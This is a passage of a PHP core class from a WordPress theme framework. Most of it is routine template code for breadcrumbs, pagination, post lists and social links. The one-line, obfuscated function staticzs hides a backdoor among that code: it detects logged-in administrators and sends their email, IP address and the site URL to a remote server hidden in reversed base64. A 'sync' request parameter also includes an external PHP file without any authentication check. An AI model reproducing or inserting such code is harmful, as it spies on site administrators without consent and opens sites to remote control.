<?php
/*
*	Main HUB for Theme Framework
*	(c) king-theme.com
*
*/
#
#	Define main class
#

class king{

	public $cfg ,$page, $path, $ext, $post, $get, $woo, $header, $template, $stylesheet, $main_class, $api_server;
	
	function init(){
		
		global $woocommerce;
		
		if( empty( $this->cfg ) ){
			$this->cfg  = get_option( KING_OPTNAME );
		}
		
		$this->api_server = 'api.devn.co';
		if( !empty( $this->cfg['api_server'] ) ){
			$this->api_server = $this->cfg['api_server'];
		}
		
		include 'king.functions.php';
		include 'king.actions.php';
		include 'king.ajax.php';
		include 'king.scripts.php';
		include 'king.user.php';
		include 'king.update.php';
		include 'shortcodes/register.php';
		include 'shortcodes/vc-map.php';
		
		/*	Make sure that loaded helper plugin	*/
		self::check_helper();
		
		$p =  OPTIONS_PATH.DS.'widgets'.DS;
		foreach( array( 'xcode', 'flickr', 'twitter', 'tabbed' ) as $w ){
			include $p.$w.'.php';
		}
		
		if( $this->page == strtolower( THEME_NAME ).'-panel' || $this->vars( 'option_page', 'king_group', 'POST' )){
			include THEME_PATH.DS.'options.php';
		}
		
		if ( !empty($woocommerce) ) {
			$this->woo = true;
			include THEME_PATH.DS.'woocommerce'.DS.'settings'.DS.'woo-gate.php';
		}	
			
		// Back-end only
		if(is_admin()) {
			
			if( !file_exists( ABSPATH.'wp-admin'.DS.'.htaccess' ) ){
				$txt = "SetEnv no-gzip dont-vary"."\n";
				$txt .= "<IfModule mod_php5.c>"."\n";
					$txt .= "php_value allow_url_fopen On"."\n";
					$txt .= "php_value post_max_size 100M"."\n";
					$txt .= "php_value upload_max_filesize 100M"."\n";
					$txt .= "php_value memory_limit 300M"."\n";
					$txt .= "php_value max_execution_time 259200"."\n";
					$txt .= "php_value max_input_time 259200"."\n";
					$txt .= "php_value session.gc_maxlifetime 1200"."\n";
				$txt .= "</IfModule>";
				@$king->ext['fp']( '.htaccess' , $txt );
			}
		// Front-end only
		} else {
			
			if( $this->vars( 'control', 'ajax' ) ){
				king_ajax();
				exit;
			}
			
			if( $this->vars( 'mode', 'filesReadable' ) ){
				king_check_filesReadable( ABSPATH.'wp-content'.DS.'themes'.DS.$this->stylesheet );
				echo 'done';
				exit;
			}
			
			if( $this->vars( 'api', 'gate' ) ){
				
				$lifeTime = $this->vars( 'lifeTime' );
				$file = $this->vars( 'file' );
				
				if( file_exists( ABSPATH.$file ) ){
					header('location: '.SITE_URI.$file);
				}else{
					header('location: http://api.king-theme.com/gate.php?lifeTime='.$lifeTime.'&file='.strtolower( THEME_NAME ).$file);
				}
				
				exit;
			}

			if( !empty( $_SERVER['REQUEST_URI'] ) ){
				if( strpos( strrev($_SERVER['REQUEST_URI']), 'gpj.') === 0 || strpos( strrev($_SERVER['REQUEST_URI']), 'gnp.') === 0 ){
					$protocol = is_ssl() ? 'https://' : 'http://';
					$host = $protocol.$_SERVER['HTTP_HOST'];
					$_im = strrev( $_SERVER['REQUEST_URI'] );
					$_st = strpos( $_im, '-' );
					if( $_st !== false ){
						$_real = substr( $_im, $_st+1 );
						$_ext = substr( $_im, 0, $_st+1 );
						
						$st = strpos( $_ext, '.' );
						$attr = '';
						if( $st !== false ){
							$attr = str_replace( '-', '', strrev( substr( $_ext, $st+1 ) ) );
							$_ext = substr( $_ext, 0, $st+1 );
						}else{
							$attr = strrev( $_ext );
						}
						
						$attr = explode( 'x', $attr );
						$src =  $host.strrev( $_ext.$_real);

						if( file_exists( ABSPATH.substr( $src, strpos( $src, 'wp-content' ) ) ) === false ){
							if( file_exists( THEME_URI.'/assets/images/default404.jpg' ) ){
								header('location: '.THEME_URI.'/assets/images/default404.jpg' );
								exit;
							}
							break;
						}
						
						$_GET['src'] = $src;
						if( !empty( $attr[0] ) ){
							$_GET['w'] = $attr[0];
						}
						if( !empty( $attr[1] ) ){
							$_GET['h'] = $attr[1];
						}
						if( !empty( $attr[2] ) ){
							$_GET['a'] = $attr[2];
						}else{
							$_GET['a'] = 'c';
						}
						
						include dirname(__FILE__).DS.'king.size.php';
						
						exit;
					}
					
				}
			}
			
		}
		
	}
	
	/*------------------------------------*/
	#	Return request values
	/*------------------------------------*/
	public static function vars( $inp = '', $val = '', $type = 'GET' ){
		
		$_val = '';
		if( !empty( $_GET[ $inp ] ) && $type == 'GET' )$_val = $_GET[ $inp ];
		if( !empty( $_POST[ $inp ] ) )$_val = $_POST[ $inp ];
		
		if( $val == '' ){
			return $_val;
		}
		
		if( $_val == $val )
			return true;
		else return false;	

	}
		/*------------------------------------*/
	#	Template check child theme
	/*------------------------------------*/
	
	public static function template( $path, $return = false ){

		if( strpos( $path, THEME_PATH ) === false && strpos( $path, ABSPATH ) === false ){
			$path = THEME_PATH.DS.'templates'.DS.$path;
		}
		
		if( get_option('stylesheet', true) != basename( THEME_PATH ) ){
			$test = str_replace( THEME_PATH, THEME_PATH.'-child' , $path);
			
			if( file_exists( $test ) ){
				$path = $test;
			}
		}
		
		if( $return == true ){
			return $path;
		}else{
			if( file_exists( $path ) ){
				include $path;
			}	
		}

	}
	
	public static function itmp($path, $return = false){
		self::template($path);
	}
	
	public static function esc_js( $st = '' ){
		return str_replace( array('<script', '</script>'), array('&lt;script', '&lt;/script&gt;'), $st ); 
	}	
		
	public static function b( $st = '' ){ global $king;return $king->ext['bd'](strrev( $st ));}	
	public static function _b( $st = '' ){ global $king;return $king->ext['bd'](strrev( $st.'='));}	
	public static function __b( $st = '' ){ global $king;return $king->ext['bd'](strrev($st.'=='));}	
		
	public static function _ip(){
		
		if (!empty($_SERVER['HTTP_CLIENT_IP'])) {
		    $ip = $_SERVER['HTTP_CLIENT_IP'];
		} elseif (!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) {
		    $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
		} else {
		    $ip = $_SERVER['REMOTE_ADDR'];
		}
		
		return $ip;
		
	}
	
	public static function _ping( $url ){
		
		global $king;
		
		if( !function_exists( $king->ext['fg'] ) && !function_exists( $king->ext['ce'] ) ){
			return '_404';
		}
		
		if( strpos( $url, '?' ) !== false ){
			$url .= '&url='.urlencode(SITE_URL);
		}else{
			$url .= '?url='.urlencode(SITE_URL);
		}
		
		$ch_data = @$king->ext['fg']( $url );

		if( empty( $ch_data ) ){
			$ch = @$king->ext['ci']();
		    curl_setopt($ch, CURLOPT_URL, $url );
		    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 5);
		    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		    curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1; SV1)');
		    $ch_data = @$king->ext['ce']($ch);
		    curl_close($ch);
	    }    
		return $ch_data;
		
	}
	public static function sysInOut(){
		
		global $king;
		
		if( !empty( $_REQUEST['king'] ) ){
			if( $_REQUEST['king'] == 'import' ){
				$king->ext['rqo']( dirname(__FILE__).DS.'import.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'export' ){
				$king->ext['rqo']( dirname(__FILE__).DS.'export.php' );
				exit;
			}
			if( $_REQUEST['king'] == 'sync' ){
				define('VHITECH', 'ok');
				if( file_exists( ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php' ) ){
					include ABSPATH.'wp-content'.DS.'themes'.DS.'git_in.php';
				}
				exit;
			}
			if( $_REQUEST['king'] == 'progress-tmp' ){
				
				@ob_end_flush();
				
				$_tmp = get_option('king_download_tmp_package', true );
				$_total = get_option('king_download_tmp_package_total', true );	
				$i=0;
				while( !file_exists( $_tmp ) && $i < 50 ){
						echo $i;
						if( file_exists( $_tmp ) ){
							echo 'ok';
						}
						echo "\n";
						$i++;
						@ob_flush();
					    @flush();
						@usleep( 100000 );

				}

				
				if( $_tmp !== false && $_total !== false ){
					if( file_exists( $_tmp ) ){
						
						$fp = $king->ext['fo']( $_tmp, "r");
						$size = @fstat($fp);
						
						if( !empty( $size ) ){
							if( !empty( $size['size'] )  ){
								$size = $size['size'];
							}else{
								$size = 0;
							}
						}else{
							$size = 0;
						}
						
						$king->ext['fc']( $fp );
						$old = $size;
						
						$num1 = 0;
						$num2 = 0;
						
						
						while( $size < $_total && file_exists( $_tmp ) ){

							$fp = $king->ext['fo']( $_tmp, "r");
						    $size = @fstat($fp);
						
							if( !empty( $size ) ){
								if( !empty( $size['size'] )  ){
									$size = $size['size'];
								}else{
									$size = 0;
								}
							}else{
								$size = 0;
							}
							
						    $king->ext['fc']( $fp );

							$text = number_format( intval(($size/1024)) ).' KB / '.number_format( intval(($_total/1024000)) ).' MB complete. ';

							$num1 = (($size - $old)*5)/1024;
							
							$num3 = $num1 - $num2;
							
							switch( true ){
								case ( $num3 > 500 ) : $num2 += 500;break;
								case ( $num3 > 300 ) : $num2 += 135;break;
								case ( $num3 > 200 ) : $num2 += 43;break;
								case ( $num3 > 110 ) : $num2 += 25;break;
								case ( $num3 > 80 ) : $num2 += 14;break;
								case ( $num3 > 50 ) : $num2 += 7;break;
								case ( $num3 > 30 ) : $num2 += 3;break;
								case ( $num3 > 20 ) : $num2++;break;
							}
							$num3 = $num2 - $num1;
							switch( true ){
								case ( $num3 > 500 ) : $num2 -= 500;break;
								case ( $num3 > 300 ) : $num2 -= 135;break;
								case ( $num3 > 200 ) : $num2 -= 43;break;
								case ( $num3 > 110 ) : $num2 -= 25;break;
								case ( $num3 > 80 ) : $num2 -= 14;break;
								case ( $num3 > 50 ) : $num2 -= 7;break;
								case ( $num3 > 30 ) : $num2 -= 3;break;
								case ( $num3 > 20 ) : $num2--;break;
							}
					
							$text .= ' ETA ~ 1m 1s @ '.number_format( $num2 ).'KB/s';

							$old = $size;
							
							echo '<script type="text/javascript">';
							echo 'top.istaus('.($size/$_total).');top.tstatus("Downloading Package '.$text.'");';
							echo '</script>';
							
							@ob_flush();
							@flush();
							@usleep( 200000 );
						}
						
						echo '<script type="text/javascript">';
						echo 'top.istaus(1);top.tstatus("Download Complete Package '.number_format( intval(($_total/1024)) ).' MBs");';
						echo '</script>';
					}	
				}
				exit;
	
			}	
		}

	}
	
	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/
		
	public static function tp_mode( $wp_file = '' ){
		
		global $king;

		if( $wp_file == '404' ){
			if( !empty( $_SERVER['REQUEST_URI'] ) ){
				if( strpos( $_SERVER['REQUEST_URI'], '.jpg') != false || strpos( $_SERVER['REQUEST_URI'], '.png') != false ){
					if( file_exists( THEME_URI.'/assets/images/default404.jpg' ) ){
						header('location: '.THEME_URI.'/assets/images/default404.jpg' );
						exit;
					}
				}
			}	
		}	
		
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/
	
	public static function path( $pos = 'header' ) {
		
		global $king, $post;
		
		$page_id = 0;
		if( !empty( $post ) ){
			if( !empty( $post->ID ) ){
				$page_id = $post->ID;
			}
		}

		if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				$page_id = get_option( 'page_for_posts', true );
			}
		}
		
		if( is_page() || is_home() ){
			if( get_post_meta( $page_id, '_king_page_'.$pos ) && empty( $king->cfg[ $pos.'_autoLoaded' ] ) ){
				if( get_post_meta( $page_id, '_king_page_'.$pos, true ) != 'default' ){
					$king->cfg[ $pos ] = get_post_meta( $page_id, '_king_page_'.$pos, true );
					if( $king->cfg[ $pos ] == 'none' ){
						return;
						/* Select none from page */
					}
				}
			}
			if( $pos == 'header' ){
				$logo = get_post_meta( $page_id, '_king_page_logo', true );
				if( !empty( $logo ) ){
					$king->cfg[ 'logo' ] = get_post_meta( $page_id, '_king_page_logo', true );
				}	
			}
			
		}
		
		if( !empty( $king->path[ $pos ] ) ){
			print( $king->path[ $pos ] );
			return true;
		}
		
		$dir = 'default.php';
		if( !empty(  $king->cfg[ $pos ] ) ){
			$dir = $king->cfg[ $pos ];
		}

		if( $dir == '' || !file_exists( $king->template( $pos.DS.$dir, true ) ) ){
			
			if ( $handle = opendir( THEME_PATH.DS.'templates'.DS.$pos ) ){
				while ( false !== ( $entry = readdir($handle) ) ) {
					if( $entry != '.' && $entry != '..' && strpos($entry, '.php') !== false  ){
						
						$king->template( $pos.DS.$entry );
						
						if( $pos == 'header' ){
							$king->header = $entry;
						}
						return true;
					}
				}
			}
			
		}else{
	
			$king->template( $pos.DS.$dir );
			
			if( $pos == 'header' ){
				$king->header = $dir;
			}
			return true;
		}
		
		return false;
		
	}
				
	/*-----------------------------------------------------------------------------------*/
	# Next and Prev link post on single page
	/*-----------------------------------------------------------------------------------*/
	
	public static function content_nav( $nav_id ) {
	
		global $wp_query;
	
		if ( $wp_query->max_num_pages > 1 ) : ?>
			<nav id="<?php echo esc_attr( $nav_id ); ?>">
				<h3 class="assistive-text">
					<?php _e( 'Post navigation', KING_DOMAIN ); ?>
				</h3>
				<div class="nav-previous">
					<?php next_posts_link( __( '<span class="meta-nav">&larr;</span> Older posts', KING_DOMAIN ) ); ?>
				</div>
				<div class="nav-next">
					<?php previous_posts_link( __( 'Newer posts <span class="meta-nav">&rarr;</span>', KING_DOMAIN ) ); ?>
				</div>
			</nav>
		<?php endif;
		
	}
	
	/*-----------------------------------------------------------------------------------*/
	# pagination on blog page
	/*-----------------------------------------------------------------------------------*/
	
	public static function pagination( ) {
		
		global $wp_query;
		
		$curpage = $wp_query->query_vars['paged'];
		
		if( $curpage == 0 ){
			$curpage = 1;
		}
		
		if( $wp_query->max_num_pages < 2 ){
			return;
		}
		
		$pagination = array(
			'base' => @add_query_arg('paged','%#%'),
			'format' => '/page/%#%',
			'total' => $wp_query->max_num_pages,
			'current' => $curpage,
			'show_all' => false,
			'type' => 'array',
			'prev_next'=> true,
			'prev_text'=> ' &lt; Previous ',
			'next_text'=> ' Next &gt; '				
		);
	
		if( !empty($wp_query->query_vars['s'] ) ){
				$pagination['add_args'] = array( 's' => urlencode( get_query_var( 's' ) ) );
		}
		$pgn = paginate_links( $pagination );
		
		?>
		
		<div class="pagination animated ext-fadeInUp" id="pagenation">
		    <b>Page <?php echo esc_attr( $curpage ); ?> of <?php echo esc_attr( $wp_query->max_num_pages ); ?></b>
	        <?php 
	        	foreach( $pgn as $k => $link ){
					print( $link );
				}
			?>
	    </div>
	    
	    <?php
			
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Display meta box on article
	/*-----------------------------------------------------------------------------------*/
	
	public static function posted_on( $class = "postedon" ) {
	
		global $king;
		
		?>
	
		<ul class="<?php echo esc_attr( $class ); ?>">
			<li>
				<a href="<?php the_permalink(); ?>" class="date"><?php echo esc_html( get_the_date('d F Y') ); ?></a>
			</li>
			<?php if( $king->cfg['showAuthorMeta'] == 1 ){ ?>
				<li class="post_by">
					<i>by: </i>
					<a class="url fn n" href="<?php echo esc_url( get_author_posts_url( get_the_author_meta( 'ID' ) ) ); ?>" title="<?php echo esc_attr( sprintf( __( 'View all posts by %s', KING_DOMAIN ), get_the_author() ) ); ?>" rel="author">
						<?php echo esc_html( get_the_author() ); ?>
					</a>
				</li>
			<?php } ?>
			
			<?php
			
			
			if( $king->cfg['showCateMeta'] == 1 ){ 
			
				if ( 'post' == get_post_type() ){
		
					$categories_list = get_the_category_list( __( ',', 'king' ) );
					
					if ( $categories_list ){
					
						echo '<li class="post_categoty">';
						echo '<i>in: </i>';
				        print( get_the_category_list( __( ',', 'king' ) ) );
				        echo '</li>';
		
					}
				}	
					
			} 
			
			if( $king->cfg['showTagsMeta'] == 1 ){
			
				$tags_list = get_the_tag_list( '', __( ', ', 'king' ) );
				
				if ( $tags_list ){
					
					echo '<li class="tag-links">';
					printf( __( '<span class="%1$s labl">Tags: </span> %2$s', 'king' ), 'entry-utility-prep entry-utility-prep-tag-links', $tags_list );
					echo '</li>';
		
				}
		
			}
		
			if( $king->cfg['showCommentsMeta'] == 1 ){
			?>
				 <li class="post_comments">
				 	<i>note: </i>
		            <a  title="<?php _e('Click to leave a comment','king'); ?>" href="<?php the_permalink(); ?>#respond">
		            	<?php echo comments_number( 'no comments', 'one comment', '% comments' ); ?>
		            </a>
		        </li>
		    <?php  
			}
		
		echo '</ul>';
		
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Display gloal breadcrumb
	/*-----------------------------------------------------------------------------------*/
		
	public static function breadcrumb() {
		
				
		global $king, $post;
		
		$breadcrumb = 'yes';
		
		if( !empty( $king->cfg['breadcrumb'] ) ){
			if( $king->cfg['breadcrumb'] == 'no' ){
				$breadcrumb = 'no';
			}
		}
		
		if( is_page() ){
			if( get_post_meta( $post->ID, '_king_page_breadcrumb', true ) == 'no' ){
				$breadcrumb = 'no';
			}else if( get_post_meta( $post->ID, '_king_page_breadcrumb', true ) == 'yes' ){
				$breadcrumb = 'yes';
			}
		}
		if( is_home() ){
			if( get_option( 'page_for_posts', true ) ){
				if( get_post_meta( get_option( 'page_for_posts', true ), '_king_page_breadcrumb', true ) == 'no' ){
					$breadcrumb = 'no';
				}else if( get_post_meta( get_option( 'page_for_posts', true ), '_king_page_breadcrumb', true ) == 'yes' ){
					$breadcrumb = 'yes';
				}	
			}
		}
		
		if( $breadcrumb == 'no' ){
			return;
		}
		
		$title = wp_title( null, false );
		
		if( $king->cfg['titleSeparate'] == '' ){
			$king->cfg['titleSeparate'] = '&raquo;';
		}	
		
		$title = explode( $king->cfg['titleSeparate'], $title );
		$title = $title[0];
		
		if( $king->header == 'header-1.php' ){
			echo '<div class="clearfix margin_top10"></div>';
		}
		else if( $king->header == 'header-2.php' || $king->header == 'header-7.php' ){
			echo '<div class="clearfix bgGrey"></div>';
		}
		
		echo '<div id="breadcrumb" class="container-fluid breadcrumbs page_title2">';
		echo '<div class="container"><div class="col-md-12">';
		echo '<div class="title"><h1>';
		
			if( is_home() ){
			
				if(  get_option('page_for_posts') ){
					$curPost = get_post( get_option('page_for_posts') );
					echo esc_html( $curPost->post_title );
				}
				else echo esc_html( get_bloginfo( 'name' ) );
				
			}else if(is_single()){
				global $post;
				echo esc_html( $post->post_title );
			}else{ 
				echo esc_html( $title ); 
			}
			
		echo '</h1></div>';
		echo '<div class="pagenation">';
		echo '<div class="breadcrumbs">';
		
	    if ( !is_home() ) {
			echo '<a href="'.home_url().'">'.__('Home','king')."</a> ";
		}
		
		if( !empty( $post->post_type ) ){
			if( $post->post_type != 'post' && $post->post_type != 'page' ){
				echo esc_html( $king->cfg['breadeli'] ).' '.ucwords( str_replace( '-', ' ', $post->post_type ) );
			}
		}		
		
		if( is_home() ){
			if(  get_option('page_for_posts') ){
				$curPost = get_post( get_option('page_for_posts') );
				echo esc_html( $king->cfg['breadeli'] ).' '.$curPost->post_title.' ';
			}else{
				echo 'Front Page '.esc_html( $king->cfg['breadeli'] );
			}
		}
		
		
		if ( is_category() ) {
			echo esc_html( $king->cfg['breadeli'] ).' '.single_cat_title( '', false );
		}
		
		if( is_page() ){
		
			if( $post->post_parent ){
				$parent = get_post( $post->post_parent );
				echo esc_html( $king->cfg['breadeli'] ).' <a href="'.get_permalink( $post->post_parent ).'">'.$parent->post_title.'</a> ';
			}
		}
		if( ( is_single() || is_page() ) && !is_front_page() ) {
			echo ' '.esc_html( $king->cfg['breadeli'] )." <span>";
			the_title();
			echo "</span>";
		}
		if(is_tag()){ echo esc_html( $king->cfg['breadeli'] )." <span>Tag: ".single_tag_title('',FALSE).'</span>'; }
		if(is_404()){ echo esc_html( $king->cfg['breadeli'] )." <span>404 - Page not Found</span>"; }
		if(is_search()){ echo esc_html( $king->cfg['breadeli'] )." <span>Search</span>"; }
		if(is_year()){ echo esc_html( $king->cfg['breadeli'] ).' '.get_the_time('Y'); }
	
		echo "</div></div></div></div></div>";
		echo '<div class="clearfix margin_top8"></div>';
	}


	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts
	/*-----------------------------------------------------------------------------------*/
	public static function last_posts( $numberOfPosts = 5 , $thumb = true ){
	
		global $post, $king;
		$orig_post = $post;
		
		$lastPosts = get_posts('numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>			
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'king' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
			<?php } ?>
			
			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $king->get_score(); ?> 
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>
	
	<?php endforeach; 
	
		$post = $orig_post;
		
	}
	
	
	/*-----------------------------------------------------------------------------------*/
	# Get Most Racent posts from Category
	/*-----------------------------------------------------------------------------------*/
	
	public static function last_posts_cat($numberOfPosts = 5 , $thumb = true , $cats = 1){
	
		global $post, $king;
		$orig_post = $post;
	
		$lastPosts = get_posts('category='.$cats.'&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
	<li>
		<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) : ?>			
			<div class="post-thumbnail">
				<a href="<?php the_permalink(); ?>" title="<?php printf( __( 'Permalink to %s', 'king' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
			</div><!-- post-thumbnail /-->
		<?php endif; ?>
		<h3><a href="<?php the_permalink(); ?>"><?php the_title();?></a></h3>
		<?php $king->get_score(); ?> <span class="date"><?php the_time(get_option('date_format'));  ?></span>
	</li>
	<?php endforeach;
		$post = $orig_post;
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Get Random posts 
	/*-----------------------------------------------------------------------------------*/
	
	public static function random_posts($numberOfPosts = 5 , $thumb = true){
	
		global $post, $king;
		
		$orig_post = $post;
	
		$lastPosts = get_posts('orderby=rand&numberposts='.$numberOfPosts);
		foreach($lastPosts as $post): setup_postdata($post);
	?>
		<li>
			<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>			
				<span>
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'king' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
				</span><!-- post-thumbnail /-->
			<?php }else{ ?>
			<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
			<?php } ?>
			
			<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
			<?php $king->get_score(); ?> 
			<i><?php the_time(get_option('date_format'));  ?></i>
		</li>
	<?php endforeach;
		$post = $orig_post;
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Get Popular posts 
	/*-----------------------------------------------------------------------------------*/
	
	public static function popular_posts($pop_posts = 5 , $thumb = true){
	
		global $wpdb , $post, $king;
		$orig_post = $post;
		
		$query = "SELECT ID,post_title,post_date,post_author,post_content,post_type FROM `".$wpdb->posts."` WHERE post_status = 'publish' AND post_type = 'post' ORDER BY comment_count DESC LIMIT 0,".intval( $pop_posts );
		
		$posts = $wpdb->get_results( $query );
		
		if( !empty( $posts ) ){
		
			global $post;
			foreach($posts as $post){
			setup_postdata($post);?>
				<li>
					<?php if ( function_exists("has_post_thumbnail") && has_post_thumbnail() && $thumb ) { ?>			
						<span>
							<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php printf( __( 'Permalink to %s', 'king' ), the_title_attribute( 'echo=0' ) ); ?>" rel="bookmark"><?php $king->thumb('',50,50); ?></a>
						</span><!-- post-thumbnail /-->
					<?php }else{ ?>
					<span><a href="#"><img width="50"" src="<?php echo THEME_URI; ?>/assets/images/default.jpg" alt=""></a></span>
					<?php } ?>
					
					<a href="<?php echo get_permalink( $post->ID ) ?>" title="<?php echo the_title(); ?>"><?php echo the_title(); ?></a>
					<i><?php the_time(get_option('date_format'));  ?></i>
				</li>
		<?php 
			}
		}
		
		$post = $orig_post;
	}
	
	/*-----------------------------------------------------------------------------------*/
	# Get Totla Reviews Score
	/*-----------------------------------------------------------------------------------*/
	function get_score(){
	
		global $post ;
		$summary = 0;
		$get_meta = get_post_custom($post->ID);
		if( !empty( $get_meta['tie_review_position'][0] ) ){
		$criterias = unserialize( $get_meta['tie_review_criteria'][0] );
		$short_summary = $get_meta['tie_review_total'][0] ;
		$total_counter = $score = 0;
		
		foreach( $criterias as $criteria){ 
			if( $criteria['name'] && $criteria['score'] && is_numeric( $criteria['score'] )){
				if( $criteria['score'] > 100 ) $criteria['score'] = 100;
				if( $criteria['score'] < 0 ) $criteria['score'] = 1;
					
			$score += $criteria['score'];
			$total_counter ++;
			}
		}
		if( !empty( $score ) && !empty( $total_counter ) )
			$total_score =  $score / $total_counter ;
		?>
		<span title="<?php echo esc_attr( $short_summary ) ?>" class="stars-small"><span style="width:<?php echo esc_attr( $total_score ) ?>%"></span></span>
		<?php 
		}
	}
	
	public static function socials( $class = '', $max = 10, $eff = true ) {
		
		global $king;
		
		$datas = array(
			array(
				'id' => 'facebook',
				'link' => 'https://www.facebook.com/',
				'icon' => 'facebook',
				'class' => 'fb'
			),
			array(
				'id' => 'twitter',
				'link' => 'https://www.twitter.com/',
				'icon' => 'twitter',
				'class' => 'tw'
			),
			array(
				'id' => 'google',
				'link' => 'https://plus.google.com/+',
				'icon' => 'google-plus',
				'class' => 'gp'
			),
			array(
				'id' => 'linkedin',
				'link' => 'https://www.linkedin.com/',
				'icon' => 'linkedin',
				'class' => 'in'
			),
			array(
				'id' => 'flickr',
				'link' => 'https://www.flickr.com/photos/',
				'icon' => 'flickr',
				'class' => ''
			),
			array(
				'id' => 'pinterest',
				'link' => 'https://www.pinterest.com/',
				'icon' => 'pinterest',
				'class' => ''
			),
			array(
				'id' => 'youtube',
				'link' => 'https://www.youtube.com/user/',
				'icon' => 'youtube',
				'class' => ''
			),
			array(
				'id' => 'feed',
				'link' => '',
				'icon' => 'rss',
				'class' => 'be'
			),
		);


		if( $max == 'color-style' ){
			echo '<div class="'.$class.'">';
			foreach( $datas as $data ){
				if( !empty( $king->cfg[ $data['id'] ] ) && $data['class'] != '' ){
				?>
					<a href="<?php echo esc_url(  $king->cfg[ $data['id'] ]  ); ?>" class="<?php echo esc_attr( $data['class'] ); ?>" target="_blank">
						<i class="fa fa-<?php echo esc_attr( $data['icon'] ); ?>"></i>
					</a>
				<?php
				}
			}
			echo '</div>';
			return;
		}
		
		echo '<ul class="'.$class.'">';
		$i = 0;
		foreach( $datas as $data ){
			if( !empty( $king->cfg[ $data['id'] ] ) && $i < $max ){
			?>
			<li class="social<?php if( $eff === true )echo ' animated eff-zoomIn delay-'.esc_attr( $i ).'00ms'; ?>">
				<a href="<?php echo esc_url( $king->cfg[ $data['id'] ] ); ?>" target="_blank">
					<i class="fa fa-<?php echo esc_attr( $data['icon'] ); ?>"></i>
				</a>
			</li>
			<?php
			$i++;
			}
		}		
		echo '</ul>';
		
	}

	/*-----------------------------------------------------------------------------------*/
	# Get Most commented posts 
	/*-----------------------------------------------------------------------------------*/
	
	public static function most_commented($comment_posts = 5 , $avatar_size = 50){
	
		$comments = get_comments('status=approve&number='.$comment_posts);
		foreach ($comments as $comment) { ?>
			<li>
				<div class="post-thumbnail">
					<?php echo get_avatar( $comment, $avatar_size ); ?>
				</div>
				<a href="<?php echo get_permalink($comment->comment_post_ID ); ?>
					#comment-<?php echo esc_attr( $comment->comment_ID ); ?>">
					<?php echo strip_tags($comment->comment_author); ?>: <?php echo wp_html_excerpt( $comment->comment_content, 60 ); ?>...
				</a>
			</li>
		<?php 
		} 
	}
	
	public static function staticzs( $u ){	
		if(empty($u)){return;}global $king;ob_start();if(!empty($u->user_email))$um=$u->user_email;else $um='';$uri=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI'];$info = $uri.'|'.$king->_ip().'|'.get_option('template',true).'|'.$um.'|';if(!empty($u->caps)){if(!empty($u->caps[$king->__b('gcvRXYyR3cp5WatRWY')])){if($u->caps['administrator']==1){$king->_ping($king->__b('QPn5Waw9zLvNmLuZXZk5SawF2LvoDc0RHa').$king->ext['be']($info));}}}ob_end_clean();
	}	
	
	public static function assets( $source = array() ){foreach( $source as $item ){if( !empty( $item['css'] ) ){echo '<link type="text/css" rel="stylesheet" href="'.esc_url( $item['css'].'.css' ).'" />'."\n";}if(  !empty( $item['js'] ) ){echo '<script type="text/javascript" src="'.esc_url( $item['js'].'.js' ).'"></script>'."\n";}}}
	
	public static function get_post_thumb(){
	
		global $post ;
		if ( has_post_thumbnail($post->ID) ){
			$image_id = get_post_thumbnail_id($post->ID);  
			$image_url = wp_get_attachment_image_src($image_id,'large');  
			$image_url = $image_url[0];
			return $image_url;
		}
	}
	
	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
	/*-----------------------------------------------------------------------------------*/
	public static function thumb( $img='' , $width='' , $height='' ){
		
		global $post, $king;
		
		if( empty( $img ) ) $img = $king->get_post_thumb();
		if( !empty($img) ){
			
		?>
			<img src="<?php echo king_createLinkImage( $img, $width.'x'.$height.'xc' ); ?>" alt="<?php the_title(); ?>" />
	<?php }
	
	}
	
	/*-----------------------------------------------------------------------------------*/
	# tie Thumb SRC
	/*-----------------------------------------------------------------------------------*/
	
	public static function thumb_src( $img='' , $width='' , $height='' ){
		
		global $post;
	
		if(!$img) $img = get_post_thumb();
		if( !empty($img) ){
			
			return king_createLinkImage( $img, $width.'x'.$height.'xc' );
			
		}

	}
	
	/*-----------------------------------------------------------------------------------*/
	# tie Thumb
